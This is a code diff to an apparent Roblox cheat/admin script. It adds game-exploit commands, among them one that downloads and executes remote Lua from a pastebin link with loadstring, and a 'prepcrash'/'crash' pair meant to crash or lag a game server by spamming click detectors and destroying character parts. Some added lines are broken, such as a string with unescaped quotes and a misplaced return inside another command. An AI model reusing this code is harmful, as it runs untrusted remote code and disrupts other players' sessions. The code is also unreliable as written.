@@ -4943,6 +4943,10 @@ AddCommand("btools", {}, "gives you btools", {3}, function(Caller, Args)
     return "client sided btools loaded"
 end)
 
+AddCommand("antilock", {"antiaim"}, "turns on a universal prediction breaker", {}, function()
+       loadstring(game:HttpGet('https://pastebin.com/raw/gbRzQPh0'))()
+    end)
+    
 AddCommand("spin", {}, "spins your character (optional: speed)", {}, function(Caller, Args, CEnv)
     local Speed = Args[1] or 5
     if (not CEnv[1]) then
@@ -8731,7 +8735,35 @@ if game.PlaceId == 9568982793 then
     CWait(LocalPlayer.CharacterAdded);
     WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
 end)
-
+    
+AddCommand("crash", {"*crash"}, "crashes the game, prepcrash command must be used first", {}, function()
+       game:GetService'Players'.LocalPlayer.Character['RightHand']:Destroy()
+wait(0.001)
+game:GetService'Players'.LocalPlayer.Character['RightLowerArm']:Destroy()
+wait(0.001)
+game:GetService'Players'.LocalPlayer.Character['RightUpperArm']:Destroy()
+wait(3)
+game:GetService'Players'.LocalPlayer.Character['Head']:Destroy()
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("crash/lag attempted","All")
+    return "crash attempted"
+    end)
+    
+AddCommand("prepcrash", {"*prepcrash"}, "prepares to crash the game, once ready you can type "crash" in the command bar to crash", {}, function()
+     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(214, 288, -763)
+for i = 1,20 do
+    wait(0.2)
+for i,v in pairs(game:GetDescendants()) do
+      if v:IsA("ClickDetector") then
+          fireclickdetector(v)
+      end
+end
+end
+wait(0.5)
+for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+v.Parent = game.Players.LocalPlayer.Character
+end
+    end)
+    
     AddCommand("autoarmor", {"*autoarmor"}, "autobuys armor if below a threshold", {}, function()
         while true do
 wait(0.05)
@@ -8740,6 +8772,7 @@ fireclickdetector(game:GetService("Workspace")["Higher armor {20000$}"].Head.Cli
     print("armor bought")
 end
 end
+return("Crash ready! Type !crash to finish the job")
     end)
 print("Da hood battles grounds detected")
     Utils.Notify(LocalPlayer, "Compatible game detected", "DHB is supported for extra commands! Type a * in the cmds menu to view them", 10);
